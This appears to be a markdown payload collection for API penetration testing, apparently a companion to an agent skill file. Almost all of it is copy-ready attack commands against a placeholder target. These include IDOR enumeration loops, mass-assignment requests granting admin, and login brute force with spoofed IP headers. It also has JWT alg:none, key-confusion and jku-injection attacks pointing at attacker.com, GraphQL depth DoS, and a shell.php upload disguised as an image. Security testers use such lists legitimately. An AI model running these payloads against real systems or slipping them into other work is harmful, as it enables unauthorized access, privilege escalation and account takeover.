# API Security Payload Collection

> This file is a companion to `SKILL.md`, organizing common payloads for API security testing by attack type.
> Purpose: Quickly find request construction patterns for specific attack types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [API Endpoint Discovery](#1-api-endpoint-discovery)
2. [BOLA (IDOR) Testing](#2-bola-idor-testing)
3. [Mass Assignment](#3-mass-assignment)
4. [Rate Limit Bypass](#4-rate-limit-bypass)
5. [JWT Attacks](#5-jwt-attacks)
6. [GraphQL Attacks](#6-graphql-attacks)
7. [Content-Type Abuse](#7-content-type-abuse)
8. [API Key Leakage Detection](#8-api-key-leakage-detection)

---

## 1. API Endpoint Discovery

### Swagger / OpenAPI Document Exposure

```bash
# Common documentation path probing
curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger.json
curl -s -o /dev/null -w "%{http_code}" https://target.com/api-docs
curl -s -o /dev/null -w "%{http_code}" https://target.com/openapi.json
curl -s -o /dev/null -w "%{http_code}" https://target.com/v2/api-docs
curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger-ui/
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/swagger
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphql
```

### kiterunner Route Discovery

```bash
# Spec-based large-scale route enumeration
kr scan https://target.com -w /usr/share/wordlists/kiterunner/routes.kite -x 20

# Only specific status codes
kr scan https://target.com -w routes.kite -x 20 --fail-status-codes 404,400
```

### ffuf API Path Enumeration

```bash
# Path Fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -mc 200,201,403,401 -fc 404

# HTTP Method Fuzzing
ffuf -w GET,POST,PUT,PATCH,DELETE,OPTIONS \
     -u https://target.com/api/v1/users/123 \
     -X FUZZ -H "Authorization: Bearer TOKEN" \
     -mc 200,201,204,403

# Version Fuzzing (discover old API versions)
ffuf -w v1,v2,v3,api,rest,graphql,internal,admin,staging \
     -u https://target.com/FUZZ/users \
     -mc 200,401,403
```

---

## 2. BOLA (IDOR) Testing

### Basic IDOR — Integer IDs

```bash
# Access USER_B's resource using USER_A's Token
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/123/profile

curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/456/profile
# Compare both responses — if both return 200 with different content -> BOLA confirmed
```

### ffuf Batch BOLA Detection

```bash
# Integer ID batch detection
seq 1 1000 > ids.txt
ffuf -w ids.txt:FUZZ_ID \
     -u https://target.com/api/v1/users/FUZZ_ID/profile \
     -H "Authorization: Bearer USER_A_TOKEN" \
     -mc 200 -fs $(curl -s -H "Authorization: Bearer USER_A_TOKEN" \
                    https://target.com/api/v1/users/SELF_ID/profile | wc -c)
```

### UUID-based IDOR

```bash
# Collect UUIDs (from other API responses, error messages, logs)
curl -s -H "Authorization: Bearer TOKEN" \
     https://target.com/api/v1/users/me/posts | jq '.[].author_id'

# Test with extracted UUIDs
for uuid in $(cat collected_uuids.txt); do
    resp=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Authorization: Bearer OTHER_USER_TOKEN" \
          "https://target.com/api/v1/documents/$uuid")
    [ "$resp" = "200" ] && echo "[+] BOLA: $uuid -> $resp"
done
```

### Multi-level BOLA

```bash
# Organization -> Project -> Document three-level BOLA
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/orgs/1/projects/5/docs/42
# Replace IDs layer by layer, testing authorization checks at each level
```

---

## 3. Mass Assignment

### Registration Endpoint Privilege Escalation

```bash
# Normal registration
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser","password":"P@ss1234","email":"test@test.com"}'

# Inject role field
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser2","password":"P@ss1234","email":"test2@test.com","role":"admin"}'
# If response includes "role":"admin" -> Mass Assignment confirmed
```

### Profile Update Injection

```bash
# Normal update
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"New Name","bio":"Hello"}'

# Inject read-only properties
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"New Name","role":"admin","is_verified":true,"email":"attacker@evil.com"}'
```

### Common Injectable Fields

```json
// The following fields should normally be read-only but may be exploitable via Mass Assignment
{"role": "admin"}
{"is_admin": true}
{"is_verified": true}
{"email_verified_at": "2026-01-01T00:00:00Z"}
{"plan": "premium"}
{"credit": 10000}
{"status": "active"}
{"permissions": ["*"]}
{"group_id": 1}
```

### PUT Full Overwrite

```bash
# PUT requests are more likely to trigger Mass Assignment (replaces entire object)
curl -s -X PUT https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"t@t.com","role":"admin","plan":"enterprise"}'
```

---

## 4. Rate Limit Bypass

### X-Forwarded-For IP Spoofing

```bash
# Change IP with each request
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}" \
         -H "X-Forwarded-For: 10.0.0.$((RANDOM%255))" \
         -H "Authorization: Bearer TOKEN" \
         https://target.com/api/v1/login \
         -d '{"email":"admin@target.com","password":"guess'$i'"}'
done
```

### Multiple Header Stacking

```bash
curl -s -H "X-Forwarded-For: 1.2.3.4" \
     -H "X-Originating-IP: 1.2.3.4" \
     -H "X-Remote-IP: 1.2.3.4" \
     -H "X-Client-IP: 1.2.3.4" \
     -H "X-Real-IP: 1.2.3.4" \
     -H "X-Host: 1.2.3.4" \
     https://target.com/api/v1/sensitive-endpoint
```

### Path Mutation Bypass

```bash
# Add meaningless path segments or parameters
curl -s https://target.com/api/v1/endpoint?param=value&_=$(date +%s)
curl -s https://target.com/api/v1/./endpoint?param=value
curl -s https://target.com/api/v1/endpoint/?param=value
curl -s https://target.com/api/v1/endpoint?param=value#fragment
curl -s https://target.com/api/v1/endpoint?param=value%00
```

### API Version Downgrade

```bash
# v2 has Rate Limit, v1 may not
curl -s https://target.com/api/v1/login -d '{"email":"x","password":"y"}'
curl -s https://target.com/api/v2/login -d '{"email":"x","password":"y"}'
```

---

## 5. JWT Attacks

### alg:none Signature Bypass

```bash
# Modify Header to {"alg":"none","typ":"JWT"}
# Keep original Payload, clear signature

# Using jwt_tool
python3 jwt_tool.py <TOKEN> -X a

# Manual construction
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64url)
payload=$(echo -n '{"sub":"admin","role":"admin"}' | base64url)
echo "${header}.${payload}."
# Note: signature part is empty
```

### RS256 -> HS256 Algorithm Confusion

```bash
# Use public key as HS256 key for signing
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem
```

### Payload Tampering

```bash
# Modify user field
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin

# Modify role field
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin

# Add jku Header injection
python3 jwt_tool.py <TOKEN> -X j -ju "https://attacker.com/jwks.json"
```

### JWT Key Brute Force

```bash
# Hashcat mode 16500 (HS256)
echo "<JWT_TOKEN>" > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Common weak key list
# secret, password, 123456, key, jwt_secret, your-256-bit-secret
```

---

## 6. GraphQL Attacks

### Introspection Query

```bash
# Full Schema extraction
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}' | jq .
```

### Deep Nesting DoS

```bash
# Test query depth limits
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(id:1){posts{comments{user{posts{comments{user{id}}}}}}}}"}'
```

### Batch Query Brute Force

```bash
# Send multiple queries in a single request (bypass Rate Limit)
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]'
```

### Unauthorized Mutation Testing

```bash
# Test if unauthenticated users can execute Mutations
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}'
```

### Field Suggestion Discovery

```bash
# Intentionally misspell field name to trigger GraphQL error suggestion
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(id:1){emaiil}}"}'
# Response may include: "Did you mean \"email\"?"
```

---

## 7. Content-Type Abuse

### JSON <-> XML Switch

```bash
# Server expects JSON, try sending XML (may trigger XXE)
curl -s -X POST https://target.com/api/v1/users \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><user><name>test</name></user>'

# Server expects XML, try sending JSON (may bypass WAF)
curl -s -X POST https://target.com/api/v1/users \
     -H "Content-Type: application/json" \
     -d '{"name":"test"}'
```

### Content-Type Parameter Pollution

```bash
# Try different Content-Types to bypass validation
curl -s -X POST https://target.com/api/v1/upload \
     -H "Content-Type: multipart/form-data" \
     -F "file=@shell.php;type=image/jpeg"

curl -s -X POST https://target.com/api/v1/data \
     -H "Content-Type: application/json; charset=utf-7"
```

---

## 8. API Key Leakage Detection

### JavaScript File Search

```bash
# Download frontend JS files and search for API Keys
curl -s https://target.com/static/js/app.js | grep -oE '(api[_-]?key|token|secret|password)["\s]*[:=]\s*["\x27][^"]{10,}'

# Common API Key prefix patterns
# AWS: AKIA[0-9A-Z]{16}
# Google AI: AIza[0-9A-Za-z_-]{35}
# Stripe: [sr]k_(live|test)_[0-9a-zA-Z]{24}
# GitHub: ghp_[0-9a-zA-Z]{36}
```

### HTTP Header Leakage

```bash
# Check response headers for version/technology information
curl -sI https://target.com/api/v1/ | grep -iE '(server|x-powered-by|x-api-version|x-debug)'
```

### Error Message Leakage

```bash
# Trigger error responses, check for stack/SQL leakage
curl -s https://target.com/api/v1/users/abc          # Invalid ID
curl -s -X POST https://target.com/api/v1/users -d 'invalid'  # Format error
curl -s https://target.com/api/v1/users/999999999    # Out-of-range ID
curl -s -H "Authorization: Bearer invalid" https://target.com/api/v1/users
```
